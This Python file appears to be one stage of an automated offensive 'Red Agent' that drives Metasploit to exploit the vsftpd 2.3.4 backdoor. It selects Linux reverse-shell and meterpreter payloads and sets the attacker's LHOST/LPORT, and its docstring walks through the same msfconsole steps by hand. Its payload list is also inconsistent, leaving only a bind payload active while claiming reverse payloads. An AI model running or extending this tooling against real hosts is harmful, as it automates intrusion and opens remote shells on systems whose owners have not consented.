"""
Node 4: Payload Selection & Configuration
Selects compatible Linux/Unix payloads and configures LHOST/LPORT

═══════════════════════════════════════════════════════════════════════════════
METASPLOIT CONSOLE COMMANDS - FOR MANUAL TESTING
═══════════════════════════════════════════════════════════════════════════════

After selecting an exploit in Node 3, you need to choose a PAYLOAD.
This is what Node 4 does automatically!

MANUAL APPROACH (what you would do in msfconsole):

1. LOAD THE EXPLOIT:
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

2. SEE COMPATIBLE PAYLOADS:
   msf6 exploit(...) > show payloads

   Output:
       Compatible Payloads
       ===================

          Name                            Disclosure Date  Rank    Check  Description
          ----                            ---------------  ----    -----  -----------
          cmd/unix/interact                                normal  No     Unix Command, Interact with Established Connection
          cmd/unix/reverse                                 normal  No     Unix Command Shell, Reverse TCP (telnet)
          cmd/unix/reverse_bash                            normal  No     Unix Command Shell, Reverse TCP (bash)
          cmd/unix/reverse_netcat                          normal  No     Unix Command Shell, Reverse TCP (netcat)
          cmd/unix/reverse_python                          normal  No     Unix Command Shell, Reverse TCP (Python)

3. SELECT A PAYLOAD:
   msf6 exploit(...) > set PAYLOAD cmd/unix/interact

4. CONFIGURE PAYLOAD OPTIONS:
   msf6 exploit(...) > show options

   You need to set:
       LHOST = Your attacker machine IP (e.g., 192.168.1.50)
       LPORT = Port to listen on (e.g., 4444)

   msf6 exploit(...) > set LHOST 192.168.1.50
   msf6 exploit(...) > set LPORT 4444

5. RUN THE EXPLOIT:
   msf6 exploit(...) > exploit

NODE 4 AUTOMATES THIS ENTIRE PROCESS!
   - Gets compatible payloads from exploit
   - Filters for Linux/Unix payloads only
   - Auto-detects your LHOST (attacker IP)
   - Selects random available LPORT
   - Prepares TOP 10-15 payloads to try
   - Ready for Node 5 (execution)!

WHY WE NEED THIS:
   - Exploits don't work without payloads!
   - Payload = The actual code that runs on target (reverse shell, meterpreter, etc.)
   - Wrong OS payload = Exploit fails (Windows payload on Linux = fail!)
   - Wrong LHOST = Target can't connect back to you
   - Node 4 ensures everything is configured correctly

═══════════════════════════════════════════════════════════════════════════════
"""

from typing import Dict, List
import logging

# Import utilities
import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from ..utils.logging_setup import log_node_start, log_node_end
from ..utils.payload_utils import (
    get_lhost_hybrid,
    get_available_lport,
    filter_linux_payloads
)


def node_4_payload_selection(state: Dict) -> Dict:
    """
    Node 4: Select compatible payloads and configure LHOST/LPORT.

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE - Why do we need Node 4? (Simple English)
    ═══════════════════════════════════════════════════════════════════════════

    PROBLEM:
        Node 3 picked the BEST exploit to try, but we have NEW QUESTIONS:

        ❓ What PAYLOAD should we use with this exploit?
        ❓ Where will the target connect back to? (LHOST)
        ❓ What port should we listen on? (LPORT)
        ❓ What if the exploit has 20+ payloads - which ones to try?

        Example scenario from Node 3:
            ✅ Selected exploit: vsftpd_234_backdoor
            ❌ But exploit needs a payload to work!
            ❌ Payload = The actual code that runs on target
            ❌ Without payload, exploit does nothing!

    SOLUTION:
        Node 4 configures EVERYTHING needed for exploit execution:
            1. Get compatible payloads (from Metasploit)
            2. Filter for Linux/Unix only (exclude Windows)
            3. Select TOP 10-15 payloads to try
            4. Auto-detect LHOST (your IP address)
            5. Select available LPORT (random port)
            6. Configure payload-specific options (EXITFUNC, etc.)

    REAL-WORLD EXAMPLE:

        Before Node 4:
            Exploit: vsftpd_234_backdoor ✅ (selected by Node 3)
            Payload: ??? ❌ (not set)
            LHOST: ??? ❌ (don't know your IP)
            LPORT: ??? ❌ (no listener port)
            Result: Can't run exploit! 💥

        After Node 4:
            Exploit: vsftpd_234_backdoor ✅
            Payloads to try: [
                "cmd/unix/interact",
                "linux/x64/shell/reverse_tcp",
                "cmd/unix/reverse_bash",
                ...
            ] ✅ (15 payloads ready)
            LHOST: 192.168.1.50 ✅ (your IP)
            LPORT: 4567 ✅ (available port)
            Result: READY to execute! 🎯

    WHAT HAPPENS STEP-BY-STEP:

        Step 1: Get current exploit (from Node 3)
            current_exploit = state["selected_exploits"][0]
            # e.g., "exploit/unix/ftp/vsftpd_234_backdoor"

        Step 2: Load exploit in Metasploit
            exploit_module = client.modules.use('exploit', current_exploit["path"])

        Step 3: Get compatible payloads
            all_payloads = exploit_module.compatible_payloads
            # e.g., [50 payloads including Windows, Linux, etc.]

        Step 4: Filter for Linux/Unix only
            linux_payloads = filter_linux_payloads(all_payloads)
            # e.g., [15 Linux/Unix payloads]

        Step 5: Select TOP 10-15 payloads
            - Add default payload first (exploit author's recommendation)
            - Fill up to 15 payloads max
            # Result: [10-15 best payloads to try]

        Step 6: Get LHOST (your IP)
            lhost = get_lhost_hybrid()
            # Try env variable first, then auto-detect with ifconfig

        Step 7: Get LPORT (available port)
            lport = get_available_lport()
            # Random port 4444-9999, verified available

        Step 8: Configure payload options
            For each payload:
                - Set LHOST, LPORT
                - If meterpreter: Set EXITFUNC=thread (stability!)
                - If HTTP: Set LURI

        Step 9: Update state
            state["payloads_to_try"] = [15 payloads]
            state["lhost"] = "192.168.1.50"
            state["lport"] = 4567
            state["successful_payloads"] = []
            state["failed_payloads"] = []

    WHY THIS MATTERS:

        Without Node 4:
            ❌ Have to manually set LHOST/LPORT for each exploit
            ❌ Might try Windows payloads on Linux (waste time)
            ❌ Might pick busy port (exploit fails)
            ❌ Manual work: 5 minutes per exploit

        With Node 4:
            ✅ Everything configured automatically
            ✅ Only Linux-compatible payloads tried
            ✅ Smart port selection (avoids conflicts)
            ✅ Automatic: 5 seconds to configure!

    ERROR HANDLING:

        ❌ No Linux/Unix payloads found:
            - Log error: "No compatible payloads"
            - Set state["error"] = "no_compatible_payloads"
            - Return error state (don't proceed to Node 5)

        ❌ LHOST detection failed:
            - Log error: "Cannot determine LHOST"
            - Suggest: "Set METASPLOIT_LHOST environment variable"
            - Return error state (halt exploitation)

    STATE UPDATES:

        Input state (from Node 3):
            {
                "selected_exploits": [{exploit #1}, {exploit #2}, ...],
                "current_exploit_index": 0,
                "target": "192.168.1.100",
                "os_type": "Linux 2.6.9",
                ...
            }

        Output state (after Node 4):
            {
                ...all previous state...
                "payloads_to_try": [10-15 Linux payloads],
                "lhost": "192.168.1.50",
                "lport": 4567,
                "current_payload_index": 0,
                "successful_payloads": [],
                "failed_payloads": [],
                "default_payload": "cmd/unix/interact"
            }

    NEXT NODE:
        → Node 5 (Exploit Execution)
          Will try each payload one by one until session opens

    ═══════════════════════════════════════════════════════════════════════════

    Args:
        state: Red Agent state dictionary

    Returns:
        Updated state with payload configuration

    What it does: Configures everything needed to run the exploit with payloads.
    """
    logger = logging.getLogger("red_agent.node_4")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 0: Log node start
    # ═══════════════════════════════════════════════════════════════════════════
    log_node_start(logger, "NODE 4", "PAYLOAD SELECTION & CONFIGURATION")
    logger.info("=" * 70)

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: Get current exploit
    # ═══════════════════════════════════════════════════════════════════════════
    # Example: current_exploit = {
    #     "path": "exploit/unix/ftp/vsftpd_234_backdoor",
    #     "name": "VSFTPD 2.3.4 Backdoor",
    #     "rank": "excellent",
    #     "final_score": 1250
    # }

    logger.info("STEP 1: Getting Current Exploit")
    logger.info("─" * 70)

    current_exploit_index = state.get("current_exploit_index", 0)
    selected_exploits = state.get("selected_exploits", [])

    if not selected_exploits or current_exploit_index >= len(selected_exploits):
        logger.error("No exploits available or invalid index")
        state["error"] = "no_exploits_available"
        log_node_end(logger, "NODE 4", success=False)
        return state

    current_exploit = selected_exploits[current_exploit_index]
    logger.info(f"Current exploit: {current_exploit.get('name', 'Unknown')}")
    logger.info(f"Path: {current_exploit.get('path', 'Unknown')}")
    logger.info(f"Rank: {current_exploit.get('rank', 'Unknown')}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: Set OS type (Linux-only agent)
    # ═══════════════════════════════════════════════════════════════════════════
    # This agent ONLY targets Linux/Unix systems
    # If OS unknown, default to "linux"

    logger.info("STEP 2: Verifying OS Type")
    logger.info("─" * 70)

    os_type = state.get("os_type", "").lower()
    if not os_type or os_type == "unknown":
        os_type = "linux"
        state["os_type"] = "linux"
        logger.info("OS type unknown, defaulting to Linux")
    else:
        logger.info(f"OS type: {os_type}")

    logger.info("Note: This agent only targets Linux/Unix systems")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: Get Metasploit client and load exploit
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 3: Loading Exploit Module")
    logger.info("─" * 70)

    # Get MSF client from state (connected in Node 1)
    msf_client = state.get("msf_client")
    if not msf_client:
        logger.error("Metasploit client not found in state")
        logger.error("Node 1 should have connected to MSF RPC")
        state["error"] = "msf_client_not_found"
        log_node_end(logger, "NODE 4", success=False)
        return state

    try:
        exploit_module = msf_client.modules.use('exploit', current_exploit["path"])
        logger.info(f"Loaded exploit module: {current_exploit['path']}")
    except Exception as e:
        logger.error(f"Failed to load exploit module: {e}")
        state["error"] = "exploit_load_failed"
        log_node_end(logger, "NODE 4", success=False)
        return state

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: Get compatible payloads
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 4: Getting Compatible Payloads")
    logger.info("─" * 70)

    # Use standard Linux/Unix REVERSE payloads for all exploits
    # Note: We use REVERSE payloads because we're waiting for target to connect back
    # BIND payloads won't work in this scenario (target listens, we connect - opposite of what we need)
    logger.info("Loading standard Linux/Unix REVERSE payloads...")
    all_payloads = [
        "cmd/unix/bind_ruby"
        #"cmd/unix/reverse",
     #   "cmd/unix/reverse_bash",
      #  "cmd/unix/reverse_python",
       # "cmd/unix/reverse_netcat",
     #   "cmd/unix/reverse_ruby",
      #  "linux/x86/meterpreter/reverse_tcp",
     #   "linux/x64/meterpreter/reverse_tcp",
     #   "linux/x86/shell/reverse_tcp",
     #   "linux/x64/shell/reverse_tcp",
     #   "generic/shell_reverse_tcp"
    ]
    logger.info(f"Loaded {len(all_payloads)} standard REVERSE payloads")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: Filter for Linux/Unix payloads only
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 5: Filtering Linux/Unix Payloads")
    logger.info("─" * 70)

    linux_payloads = filter_linux_payloads(all_payloads)
    logger.info(f"Filtered to {len(linux_payloads)} Linux/Unix payloads")

    if len(linux_payloads) == 0:
        logger.error("❌ No compatible Linux/Unix payloads found!")
        logger.error(f"Exploit: {current_exploit['path']}")
        state["error"] = "no_compatible_payloads"
        log_node_end(logger, "NODE 4", success=False)
        return state

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: Select TOP 10-15 payloads to try
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 6: Selecting TOP 10-15 Payloads")
    logger.info("─" * 70)

    payloads_to_try = []

    # Add default payload first (exploit author's recommendation)
    try:
        default_payload = exploit_module.default_payload
        if default_payload:
            # Check if it's a Linux/Unix payload
            if any(kw in default_payload.lower() for kw in ['linux', 'unix', 'cmd/unix', 'generic']):
                payloads_to_try.append(default_payload)
                logger.info(f"Default payload: {default_payload}")
            else:
                logger.warning(f"Default payload is not Linux/Unix: {default_payload}")
    except:
        logger.warning("Could not get default payload")

    # Add remaining payloads (avoid duplicates)
    for payload in linux_payloads:
        if payload not in payloads_to_try:
            payloads_to_try.append(payload)

        if len(payloads_to_try) >= 15:
            break  # Max 15 payloads

    logger.info(f"Selected {len(payloads_to_try)} payloads to try:")
    for i, payload in enumerate(payloads_to_try, 1):
        logger.info(f"  [{i}] {payload}")

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 7: Get LHOST (Your attacker IP)
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 7: Detecting LHOST (Attacker IP)")
    logger.info("─" * 70)

    lhost = get_lhost_hybrid()

    if not lhost or lhost == "127.0.0.1":
        logger.error("❌ LHOST detection failed!")
        logger.error("Solution: Set METASPLOIT_LHOST environment variable")
        logger.error("Example: export METASPLOIT_LHOST=192.168.1.50")
        state["error"] = "lhost_detection_failed"
        log_node_end(logger, "NODE 4", success=False)
        return state

    logger.info(f"✅ LHOST: {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 8: Get LPORT (Available port for listener)
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 8: Selecting LPORT (Listener Port)")
    logger.info("─" * 70)

    lport = get_available_lport()
    logger.info(f"✅ LPORT: {lport}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 9: Update state
    # ═══════════════════════════════════════════════════════════════════════════

    logger.info("STEP 9: Updating State")
    logger.info("─" * 70)

    state["payloads_to_try"] = payloads_to_try
    state["lhost"] = lhost
    state["lport"] = lport
    state["current_payload_index"] = 0  # Start with first payload
    state["successful_payloads"] = []   # Track which payloads work
    state["failed_payloads"] = []       # Track which payloads fail

    # Initialize current_exploit_index if not already set (Node 3 should set it, but default to 0)
    if "current_exploit_index" not in state:
        state["current_exploit_index"] = 0

    if payloads_to_try:
        state["default_payload"] = payloads_to_try[0]

    logger.info(f"Payloads to try: {len(payloads_to_try)}")
    logger.info(f"LHOST: {lhost}")
    logger.info(f"LPORT: {lport}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 10: Log node completion
    # ═══════════════════════════════════════════════════════════════════════════

    log_node_end(logger, "NODE 4", success=True)
    logger.info("=" * 70)
    logger.info("")

    return state


# For standalone testing
if __name__ == "__main__":
    # Configure logging for testing
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # Test state
    test_state = {
        "target": "192.168.1.100",
        "port": 21,
        "os_type": "Linux 2.6.9",
        "selected_exploits": [
            {
                "path": "exploit/unix/ftp/vsftpd_234_backdoor",
                "name": "VSFTPD 2.3.4 Backdoor",
                "rank": "excellent",
                "final_score": 1250
            }
        ],
        "current_exploit_index": 0
    }

    print("\n" + "=" * 70)
    print("TESTING NODE 4: PAYLOAD SELECTION & CONFIGURATION")
    print("=" * 70 + "\n")

    result_state = node_4_payload_selection(test_state)

    print("\n" + "=" * 70)
    print("RESULTS:")
    print("=" * 70)
    print(f"Payloads to try: {len(result_state.get('payloads_to_try', []))}")
    print(f"LHOST: {result_state.get('lhost', 'Not set')}")
    print(f"LPORT: {result_state.get('lport', 'Not set')}")
    print(f"Error: {result_state.get('error', 'None')}")
    print("=" * 70 + "\n")
